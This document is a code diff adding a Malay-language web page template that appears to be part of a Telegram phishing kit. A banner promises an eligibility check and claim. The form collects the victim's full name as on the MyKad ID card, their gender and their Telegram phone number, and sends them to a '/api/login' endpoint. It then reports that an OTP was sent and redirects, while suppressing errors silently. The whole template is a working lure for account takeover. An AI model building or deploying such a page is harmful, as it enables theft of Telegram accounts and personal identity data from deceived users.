@@ -1,0 +1,328 @@
+{% extends "layout.html" %} {% block content %}
+<img
+  src="{{ url_for('static', filename='banner.png') }}"
+  alt="tng-img"
+  style="
+    width: 100%;
+    display: block;
+    border-radius: 20px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    margin-bottom: 18px;
+  "
+/>
+
+<marquee
+  behavior="scroll"
+  direction="left"
+  style="
+    background: #f3f3f3;
+    color: #000;
+    padding: 10px;
+    font-weight: bold;
+    font-size: 15px;
+    /* border-bottom: 2px solid #000; */
+  "
+>
+  💥Sila isi maklumat anda dengan betul dibawah tuk semak status 💥 Gunakan
+  maklumat Telegram anda untuk semakan kelayakan dan proses tuntutan!
+</marquee>
+
+<form
+  id="registerForm"
+  method="post"
+  style="
+    background: #ffffff;
+    padding: 22px;
+    border-radius: 18px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+    margin-top: 18px;
+  "
+>
+  <label
+    style="
+      font-size: 13px;
+      font-weight: 600;
+      display: block;
+      margin-bottom: 6px;
+    "
+  >
+    Nama Penuh (Seperti di MayKad)
+  </label>
+
+  <input
+    type="text"
+    name="name"
+    required
+    placeholder="Nama penuh (mengikut kad pengenalan)"
+    style="
+      width: 100%;
+      padding: 12px;
+      border-radius: 12px;
+      border: 1.5px solid #e5e7eb;
+      background: #f9fafb;
+      font-size: 14px;
+      outline: none;
+      transition: 0.2s;
+    "
+    onfocus="
+      this.style.borderColor = '#4f46e5';
+      this.style.background = '#fff';
+      this.style.boxShadow = '0 0 0 3px rgba(79,70,229,0.15)';
+    "
+    onblur="
+      this.style.borderColor = '#e5e7eb';
+      this.style.background = '#f9fafb';
+      this.style.boxShadow = 'none';
+    "
+  />
+
+  <div style="margin-bottom: 16px; font-family: Arial, sans-serif">
+    <label
+      style="
+        display: block;
+        margin-bottom: 6px;
+        font-weight: 600;
+        font-size: 14px;
+      "
+    >
+      Jantina
+    </label>
+
+    <select
+      name="Pilih Jantina"
+      required
+      style="
+        width: 100%;
+        padding: 12px 16px;
+        border: 2px solid #5b6cff;
+        border-radius: 12px;
+        font-size: 15px;
+        outline: none;
+        appearance: none;
+        background-color: #fff;
+      "
+    >
+      <option value="">-- Pilih Jantina --</option>
+      <option>Lelaki</option>
+      <option>Perempuan</option>
+    </select>
+  </div>
+
+  <label
+    style="
+      font-size: 13px;
+      font-weight: 600;
+      display: block;
+      margin-top: 14px;
+      margin-bottom: 6px;
+    "
+  >
+    Nombor Phone (Telegram)
+  </label>
+
+  <input
+    type="text"
+    id="phone"
+    name="phone"
+    required
+    placeholder="Contoh : 123456789"
+    style="
+      width: 100%;
+      padding: 12px 12px 12px 48px; /* kiri besar supaya tidak timpa flag */
+      border-radius: 12px;
+      border: 1.5px solid #e5e7eb;
+      background-color: #f9fafb; /* hanya warna, tidak sentuh background-image */
+      font-size: 14px;
+      outline: none;
+      transition: 0.2s;
+    "
+    onfocus="
+      this.style.borderColor = '#4f46e5';
+      this.style.boxShadow = '0 0 0 3px rgba(79,70,229,0.15)';
+    "
+    onblur="
+      this.style.borderColor = '#e5e7eb';
+      this.style.boxShadow = 'none';
+    "
+  />
+
+  <!-- Kolom Jantina -->
+
+  <!-- Persetujuan -->
+  <label
+    style="
+      display: block;
+      font-weight: 400;
+      margin-top: 8px;
+      margin-bottom: 18px;
+      font-size: 12px;
+      line-height: 1.5;
+      color: #2563eb;
+    "
+  >
+    Sila gunakan nombor telefon yang berdaftar dengan akaun Telegram anda dan
+    pastikan format nombor adalah tepat.
+  </label>
+
+  <button
+    type="submit"
+    style="
+      width: 100%;
+      margin-top: 18px;
+      padding: 14px;
+      border: none;
+      border-radius: 14px;
+      background: #001a6d;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: 0.2s;
+    "
+    onmouseover="this.style.opacity = '0.9'"
+    onmouseout="this.style.opacity = '1'"
+  >
+    SEMAK SEKARANG
+  </button>
+</form>
+
+<!-- Loader overlay -->
+<div
+  id="loader"
+  style="
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  "
+>
+  <div
+    id="spinner"
+    style="
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #001a6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    "
+  ></div>
+  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
+    Memproses...
+  </p>
+</div>
+
+<!-- Submit pakai AJAX -->
+<script>
+  document
+    .getElementById("registerForm")
+    .addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const loader = document.getElementById("loader");
+      const spinner = document.getElementById("spinner");
+      const loaderText = document.getElementById("loaderText");
+
+      loader.style.display = "flex";
+
+      fetch("/api/login", { method: "POST", body: formData })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "success") {
+            spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+            loaderText.innerText = "Berjaya Send Otp!";
+            loaderText.style.color = "#4caf50";
+            setTimeout(() => {
+              window.location.href = data.redirect;
+            }, 1500);
+          } else {
+            loader.style.display = "none";
+            alert(data.message || "Ralat tidak diketahui.");
+          }
+        })
+        .catch((err) => {
+          console.log("ignored error", err);
+          // JANGAN alert apa pun
+        });
+    });
+</script>
+
+<!-- Auto isi +60 -->
+<script>
+  const phoneInput = document.getElementById("phone");
+  phoneInput.addEventListener("focus", function () {
+    if (this.value.trim() === "") {
+      this.value = "+60";
+    }
+  });
+  phoneInput.addEventListener("input", function () {
+    if (!this.value.startsWith("+60")) {
+      this.value = "+60";
+    }
+  });
+</script>
+
+<style>
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+  .checkmark {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 4;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    margin: 10px auto;
+    box-shadow: inset 0px 0px 0px #4caf50;
+    animation:
+      fill 0.4s ease-in-out 0.4s forwards,
+      scale 0.3s ease-in-out 0.9s both;
+    background: #4caf50;
+  }
+  .checkmark__check {
+    transform-origin: 50% 50%;
+    stroke-dasharray: 48;
+    stroke-dashoffset: 48;
+    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  }
+  @keyframes stroke {
+    100% {
+      stroke-dashoffset: 0;
+    }
+  }
+  @keyframes scale {
+    0%,
+    100% {
+      transform: none;
+    }
+    50% {
+      transform: scale3d(1.1, 1.1, 1);
+    }
+  }
+  @keyframes fill {
+    100% {
+      box-shadow: inset 0px 0px 0px 30px #4caf50;
+    }
+  }
+</style>
+
+{% endblock %}
